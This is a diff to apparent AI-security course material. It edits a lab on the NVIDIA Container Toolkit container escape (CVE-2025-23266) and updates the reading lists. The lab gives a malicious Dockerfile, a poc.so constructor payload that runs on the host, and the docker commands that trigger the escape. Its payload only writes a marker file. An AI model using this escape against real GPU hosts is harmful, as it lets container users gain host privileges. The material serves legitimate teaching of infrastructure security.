@@ -405,7 +405,7 @@ docker run --runtime=nvidia --gpus=all <malicious-image>
   → hook cwd is container root filesystem
   → /proc/self/cwd/poc.so resolves to attacker's library in the image
   → poc.so constructor runs on the HOST with hook privileges
-  → write /tmp/output-<yourname> (or any host path)
+  → write /tmp/output-{yourname} (or any host path)
 ```
 
 **Key resources:**
@@ -422,21 +422,21 @@ docker run --runtime=nvidia --gpus=all <malicious-image>
 | Regular user (non-root) | Exploit must work without sudo |
 | `gcc`, `make`, `docker` | For building `poc.so` and the image |
 
-<!-- FIXME: is there a course lab machine for this? -->
+<!-- TODO(course authors): Confirm whether a course lab machine is provided for this exercise. -->
 On the **course lab machine**, a vulnerable stack is pre-installed — do **not** install or upgrade NVIDIA packages.
 
 ### Setup
 
 ```bash
 cd day6-infrastructure/module1
-cp -r test day6-nvidia-<yourname>    # e.g. day6-nvidia-guava
-cd day6-nvidia-<yourname>
+cp -r test day6-nvidia-{yourname}    # e.g. day6-nvidia-guava
+cd day6-nvidia-{yourname}
 ```
 
 You should have:
 
 ```
-day6-nvidia-<yourname>/
+day6-nvidia-{yourname}/
 ├── poc.c        # your payload (edit this)
 ├── Dockerfile   # malicious image (edit this)
 └── Makefile     # builds poc.so and Docker image
@@ -464,7 +464,7 @@ void __attribute__((constructor)) init(void) {
     strcat(message, "\n");
 
     // Use a UNIQUE filename for your pair/team
-    int fd = open("/tmp/output-<yourname>", O_WRONLY | O_CREAT | O_APPEND, 0644);
+    int fd = open("/tmp/output-{yourname}", O_WRONLY | O_CREAT | O_APPEND, 0644);
     if (fd != -1) {
         write(fd, message, strlen(message));
         close(fd);
@@ -472,7 +472,7 @@ void __attribute__((constructor)) init(void) {
 }
 ```
 
-Replace `<yourname>` with something unique (e.g. `output-guava`, `output-pranav`).
+Replace `{yourname}` with something unique (e.g. `output-guava`, `output-pranav`).
 
 ### Step 2: Write `Dockerfile`
 
@@ -511,9 +511,9 @@ docker images nvidia-ctk-image
 Simulate loading your library into `nvidia-ctk` directly:
 
 ```bash
-rm -f /tmp/output-<yourname>
+rm -f /tmp/output-{yourname}
 LD_PRELOAD=./poc.so nvidia-ctk --version
-cat /tmp/output-<yourname>
+cat /tmp/output-{yourname}
 ```
 
 Expected:
@@ -527,20 +527,20 @@ This confirms the payload works. It does **not** prove the full container escape
 ### Step 5: Run the exploit
 
 ```bash
-rm -f /tmp/output-<yourname>
+rm -f /tmp/output-{yourname}
 
 docker run --rm --runtime=nvidia --gpus=all nvidia-ctk-image echo hello
 
-ls -l /tmp/output-<yourname>
-cat /tmp/output-<yourname>
+ls -l /tmp/output-{yourname}
+cat /tmp/output-{yourname}
 ```
 
-**Success:** `/tmp/output-<yourname>` exists **on the host** after the container exits, even though you ran Docker as a regular user. The container only printed `hello`; the escape happened in the privileged hook before the container process started.
+**Success:** `/tmp/output-{yourname}` exists **on the host** after the container exits, even though you ran Docker as a regular user. The container only printed `hello`; the escape happened in the privileged hook before the container process started.
 
 Clean up:
 
 ```bash
-sudo rm /tmp/output-<yourname>
+sudo rm /tmp/output-{yourname}
 ```
 
 ### Host setup (for self-testing)
@@ -1816,22 +1816,31 @@ This comprehensive day covered three critical dimensions of AI infrastructure se
 ### Further Reading
 
 **Policy and Framework Documents:**
-- RAND Corporation: "Securing AI Model Weights" - https://www.rand.org/content/dam/rand/pubs/research_reports/RRA2800/RRA2849-1/RAND_RRA2849-1.pdf
-- IAPS Research: "Accelerating AI Data Center Security" - https://www.iaps.ai/research/accelerating-ai-data-center-security
-- NIST AI Risk Management Framework - https://www.nist.gov/itl/ai-risk-management-framework
+- [RAND Corporation: *Securing AI Model Weights*](https://www.rand.org/content/dam/rand/pubs/research_reports/RRA2800/RRA2849-1/RAND_RRA2849-1.pdf)
+- [IAPS Research: *Accelerating AI Data Center Security*](https://www.iaps.ai/research/accelerating-ai-data-center-security)
+- [NIST AI Risk Management Framework](https://www.nist.gov/itl/ai-risk-management-framework)
 
 **Vulnerability Research:**
-- Wiz CVE-2025-23266 Analysis - https://www.wiz.io/blog/nvidia-ai-vulnerability-cve-2025-23266-nvidiascape
-- NVIDIA Security Advisories - https://www.nvidia.com/en-us/security/
-- Container Escape Techniques - OWASP Container Security Guide
+- [Wiz CVE-2025-23266 analysis](https://www.wiz.io/blog/nvidia-ai-vulnerability-cve-2025-23266-nvidiascape)
+- [NVIDIA security advisories](https://www.nvidia.com/en-us/security/)
+- [OWASP Docker Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html)
 
 **GPU Security Research:**
-- GPUHammer: RowHammer Attacks on GPU Memories - https://gpuhammer.com/
-- GPU Side-Channel Attacks - https://leakcanary.net/
-- AI Hardware Security - https://aivillage.org/large%20language%20models/threat-modeling-llm/
+- [GPUHammer: RowHammer Attacks on GPU Memories](https://gpuhammer.com/)
+- [GPU side-channel attacks](https://leakcanary.net/)
+- [AI hardware security threat modeling](https://aivillage.org/large%20language%20models/threat-modeling-llm/)
 
 **Implementation Resources:**
-- NVIDIA Container Toolkit Security Guide
-- Kubernetes GPU Device Plugin Security
-- Docker Security Best Practices for AI Workloads
+- [NVIDIA Container Toolkit documentation](https://docs.nvidia.com/datacenter/cloud-native/container-toolkit/latest/)
+- [Kubernetes device-plugin documentation](https://kubernetes.io/docs/concepts/extend-kubernetes/compute-storage-net/device-plugins/)
+- [Docker Engine security documentation](https://docs.docker.com/engine/security/)
+"""
+
+# %%
+"""
+## Further projects
+
+- Patch or reconfigure the vulnerable container-toolkit environment, rerun the exploit path, and show exactly which precondition no longer holds.
+- Add one defense—such as ECC behavior, stricter object bounds, or allocator isolation—to the GPUBreach simulator and identify the first chain stage it breaks and the cost it introduces.
+- **One-week project:** reproduce one infrastructure case in an isolated lab and turn it into an evidence-backed security assessment with instrumentation, feasibility bounds, mitigations, and a safe teardown procedure.
 """
